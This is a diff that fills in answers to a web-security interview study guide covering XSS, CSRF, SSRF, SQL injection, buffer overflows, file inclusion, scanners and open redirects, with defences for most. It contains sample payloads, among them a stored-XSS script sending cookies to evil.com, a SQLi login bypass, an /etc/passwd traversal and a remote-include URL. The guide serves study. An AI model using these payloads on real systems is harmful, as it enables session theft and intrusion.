@@ -26,7 +26,11 @@ account lockouts, IP restrictions, fail2ban, commercial versions thereof, etc.
 
 ### How would you hunt for XSS?
 
+Map every place user input can enter and later be rendered (URL params, form fields, headers, cookies, path, and stored data shown back to users). Inject a unique marker, then context-appropriate payloads (`"><svg onload=alert(1)>`, `';alert(1)//`, event handlers) and see whether it is reflected or stored unencoded and executed. Test each output context separately — HTML body, HTML attribute, JavaScript, URL, and CSS each need a different breakout. For DOM XSS, trace client-side sources (`location`, `document.referrer`) to dangerous sinks (`innerHTML`, `document.write`, `eval`). Proxies (Burp/ZAP) and their scanners speed this up, but manual context analysis catches what scanners miss.
+
 #### Follow up: Give me an example of XSS and what you can do with it.
+
+Example: a comment field stores `<script>fetch('https://evil.com/?c='+document.cookie)</script>`, which then runs in the browser of everyone who views the comment (stored XSS). With XSS you can steal session cookies/tokens, perform actions as the victim, log keystrokes, rewrite the page for phishing, hook the browser with a framework like BeEF, or chain to a browser exploit. `HttpOnly` cookies blunt cookie theft but not the ability to act as the user.
 
 ### Prevention on XSS 
 
@@ -40,9 +44,13 @@ In addition, a strong CSP provides an additional layer of protection against XSS
 
 ### What is CSP (Content Security Policy) ?
 
+An HTTP response header (`Content-Security-Policy`) that tells the browser which sources it may load or execute content from — scripts, styles, images, frames, etc. By whitelisting trusted origins and forbidding inline scripts and `eval`, it adds defense-in-depth against XSS and data injection. Example: `default-src 'self'; script-src 'self' https://cdn.example.com`. Inline scripts can be allowed safely with a per-response nonce or hash. CSP is a mitigation layer, not a replacement for output encoding.
+
 ### Cross-Site Request Forgery CSRF
 
 #### What is CSRF?
+
+Cross-Site Request Forgery tricks an authenticated user's browser into sending an unwanted state-changing request to a site where they are already logged in, abusing the browser's automatic inclusion of cookies. Example: a hidden auto-submitting form on a malicious page fires a fund transfer to the victim's bank using their live session; the server cannot tell it from a genuine request. Defenses: anti-CSRF tokens, `SameSite` cookies, verifying Origin/Referer, and re-authentication for sensitive actions.
 
 #### How does one defend against CSRF? 
 
@@ -58,11 +66,15 @@ In addition, consider Same-Site Cookie for preventing CSRF attacks.
 
 ### What is SSRF Server Side Request Forgery?
 
+Server-Side Request Forgery makes the server itself issue attacker-chosen requests. By controlling a URL the server fetches, an attacker reaches destinations they cannot hit directly — internal-only services, admin panels, or the cloud metadata endpoint (`http://169.254.169.254/`) to steal instance credentials — and can port-scan the internal network. Defenses: allowlist outbound destinations, block private/link-local ranges and the metadata IP, restrict URL schemes, and never pass raw user-supplied URLs to server-side fetchers.
+
 ### What is SQL Injection? Give me an example.
 
+SQL injection happens when untrusted input is concatenated into a SQL query, letting an attacker change the query's logic. Example: a login query `SELECT * FROM users WHERE user='$u' AND pass='$p'` with `u = admin'--` becomes `...WHERE user='admin'--' AND pass='...'`, commenting out the password check and logging in as admin. Impact ranges from reading/modifying/deleting data and dumping the whole database to, in some configurations, command execution on the host.
+
 #### Follow up:
-1. SQL Injection prevention
-2. What is blind SQL Injection?
+1. **SQL Injection prevention:** parameterized queries / prepared statements (the primary fix), ORMs that parameterize, input validation, least-privilege database accounts, and a WAF as a backstop.
+2. **What is blind SQL Injection?** SQLi where the app returns no data or error messages, so the attacker infers results indirectly — *boolean-based* (a true/false condition changes the response) or *time-based* (e.g. `' OR SLEEP(5)--` delays the response when the condition is true).
 
 ### HTTP Related
 
@@ -116,11 +128,19 @@ Cross-Origin Resource Sharing. Can specify allowed origins in HTTP headers. Send
 
 ### What is SRI (Sub-Resource Integrity)?
 
+Subresource Integrity lets a page pin the expected content of an external script or stylesheet via an `integrity` attribute holding a cryptographic hash. The browser fetches the resource (e.g. from a CDN) and runs it only if the hash matches, so a tampered or compromised third-party file is rejected. Example: `<script src="https://cdn.example.com/lib.js" integrity="sha384-..." crossorigin="anonymous"></script>`.
+
 ### Buffer Overflow
 
 #### How does a buffer overflow work? 
 
+A program writes more data into a fixed-size buffer than it can hold, overwriting adjacent memory. On the stack, overflowing a local buffer can overwrite the saved return address; when the function returns, execution jumps to an attacker-chosen location — injected shellcode, or (with a non-executable stack) a ROP chain built from existing code. The root cause is missing bounds checks, often via unsafe functions like `strcpy`, `gets`, or `sprintf`.
+
 #### How can one defend against buffer overflows? 
+
+- Safe coding: bounds-check all copies, use length-limited functions (`strncpy`, `snprintf`), and prefer memory-safe languages (Rust, Go, Java).
+- Compiler/OS mitigations: stack canaries, DEP/NX (non-executable stack), ASLR, `FORTIFY_SOURCE`, and control-flow integrity.
+- Process: code review, static analysis, and fuzzing to find overflows before release.
 
 ### Directory traversal 
 
@@ -150,10 +170,20 @@ Miners, cred stealers, adware.
 
 ### Local file inclusion
 
+A flaw where user input is used to include a file from the local server (e.g. `?page=../../../../etc/passwd`), letting an attacker read sensitive files or, combined with tricks like log poisoning or an uploaded file, achieve code execution. Prevent with input allowlisting and never passing user input into include/`require` paths.
+
 ### Remote file inclusion (not as common these days)
+
+Like LFI, but the application includes a file from a remote URL supplied by the attacker (e.g. `?page=http://evil.com/shell.txt`), directly executing attacker code on the server. Rare today because most runtimes disable remote includes by default (e.g. PHP `allow_url_include=Off`).
 
 ### Web vuln scanners. 
 
+Automated tools that crawl an app and probe for common flaws (XSS, SQLi, misconfigurations, outdated components) — e.g. Burp Suite, OWASP ZAP, Nikto, Acunetix. Good for breadth and low-hanging fruit, but they miss logic flaws and produce false positives, so manual testing is still needed.
+
 ### SQLmap.
 
+An open-source tool that automates detecting and exploiting SQL injection — enumerating databases, dumping tables, and in some cases getting an OS shell. Widely used to confirm and demonstrate the impact of SQLi found during testing.
+
 ### Malicious redirects.
+
+Open-redirect and forced-redirect flaws where an app sends users to an attacker-controlled URL (e.g. `?next=http://evil.com`), used for phishing, credential theft, or malware delivery while appearing to come from a trusted site. Prevent by allowlisting redirect targets and avoiding user-controlled redirect destinations.
